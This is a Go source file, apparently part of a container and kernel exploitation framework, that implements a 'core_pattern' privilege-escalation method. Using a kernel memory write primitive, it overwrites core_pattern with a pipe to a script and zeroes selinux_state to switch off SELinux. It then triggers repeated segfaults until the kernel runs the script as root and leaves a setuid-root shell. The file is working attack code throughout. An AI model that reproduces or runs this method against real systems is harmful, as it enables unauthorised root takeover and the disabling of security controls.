package kernelprivesc

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"time"

	"github.com/ctrsploit/sploit-spec/pkg/log"
)

// CorePatternMethod overwrites core_pattern with a pipe directive
// (|/path/to/script %P), then triggers a coredump by fork+SIGSEGV. The kernel
// invokes the pipe target as root to consume the core. The script drops a
// setuid-root bash copy.
type CorePatternMethod struct {
	Artifact ShellArtifact
	Prefix   string
}

func (CorePatternMethod) Name() string { return "core_pattern" }

func (CorePatternMethod) Available(p KernelWritePrimitive) (bool, error) {
	if _, err := p.Kaddr("core_pattern"); err != nil {
		return false, nil
	}
	return true, nil
}

func (m CorePatternMethod) artifact(p KernelWritePrimitive) ShellArtifact {
	if m.Artifact.ScriptPath != "" {
		return m.Artifact
	}
	prefix := m.Prefix
	if prefix == "" {
		prefix = p.ExpName()
	}
	return NewShellArtifact(prefix)
}

func (m CorePatternMethod) Prepare(p KernelWritePrimitive) (ShellArtifact, error) {
	a := m.artifact(p)
	if err := a.PrepareScript(); err != nil {
		return ShellArtifact{}, err
	}
	corePattern, err := p.Kaddr("core_pattern")
	if err != nil {
		return ShellArtifact{}, fmt.Errorf("resolve core_pattern: %w", err)
	}
	pipeVal := "|" + a.ScriptPath + " %P\x00"
	if err := p.WriteKmem(corePattern, []byte(pipeVal)); err != nil {
		return ShellArtifact{}, fmt.Errorf("overwrite core_pattern: %w", err)
	}
	if selinux, err := p.Kaddr("selinux_state"); err == nil {
		if err := p.MemsetKmem(selinux, 0, 4); err != nil {
			log.Logger.Warnf("core_pattern: zero selinux_state: %v (continuing)", err)
		}
	}
	return a, nil
}

func (m CorePatternMethod) TriggerAndWait(p KernelWritePrimitive, a ShellArtifact) error {
	// The crashing child writes a core dump. When core_pattern is a pipe
	// directive (our overwrite) the kernel pipes the core to our script as
	// root — no core FILE is produced. But when core_pattern is NOT yet
	// overwritten (e.g. running the method standalone on a kernel where the
	// pivot hasn't fired, or a leftover fixed core_pattern), the kernel writes
	// a real core.* file in the child's cwd. To avoid littering the caller's
	// cwd (and the repo, when tests run here) with core dumps in that case,
	// run the child in a private scratch dir and clean it up after.
	scratch, err := os.MkdirTemp("", "cve-corepattern-")
	if err != nil {
		return fmt.Errorf("core_pattern: mkdtemp: %w", err)
	}
	defer os.RemoveAll(scratch)
	for i := 0; i < 20; i++ {
		if err := triggerCoredump(scratch); err != nil {
			log.Logger.Warnf("coredump trigger %d: %v", i, err)
		}
		time.Sleep(150 * time.Millisecond)
		if a.CheckEscalated() {
			return nil
		}
	}
	return fmt.Errorf("core_pattern: root shell did not appear after 20 triggers")
}

// triggerCoredump forks a child in dir that raises RLIMIT_CORE to unlimited and
// SIGSEGVs. The kernel writes a core dump; because core_pattern is now a pipe
// directive (set by Prepare), it pipes the core to our root script instead of
// writing a core file. Running in a scratch dir means any real core file (if
// core_pattern wasn't actually overwritten) lands there and is cleaned up by the
// caller rather than in the caller's cwd.
func triggerCoredump(dir string) error {
	cmd := exec.Command("/bin/sh", "-c", "ulimit -c unlimited 2>/dev/null; kill -SEGV $$")
	cmd.Dir = dir
	cmd.Stdin = nil
	cmd.Stdout = nil
	cmd.Stderr = nil
	_ = cmd.Run() // child dies from SIGSEGV — expected
	// Belt-and-suspenders: also remove any core file the kernel wrote here
	// (only present if core_pattern was NOT a pipe directive).
	matches, _ := filepath.Glob(filepath.Join(dir, "core*"))
	for _, m := range matches {
		_ = os.Remove(m)
	}
	return nil
}
